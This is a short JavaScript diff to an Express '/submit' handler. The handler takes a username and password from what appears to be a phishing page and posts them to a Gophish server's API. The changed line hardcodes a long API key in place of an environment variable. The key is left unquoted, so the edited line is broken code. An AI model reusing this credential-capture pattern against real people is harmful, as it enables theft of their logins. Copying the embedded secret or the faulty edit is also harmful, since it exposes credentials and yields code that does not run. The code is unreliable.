@@ -22,7 +22,7 @@ app.post('/submit', async (req, res) => {
     await axios.post(
       `${GOPHISH_HOST}/api/v1/phish`,
       { rid, email: username, payload: { username, password } },
-      { headers: { Authorization: GOPHISH_API_KEY } }
+      { headers: { Authorization: 4f632c7fb574989120f7e8580b5982fe2d9ea1df3930502c05f5465f4fd0ae0f } }
     )
   } catch (err) {
     console.error('Gophish API error:', err.message)
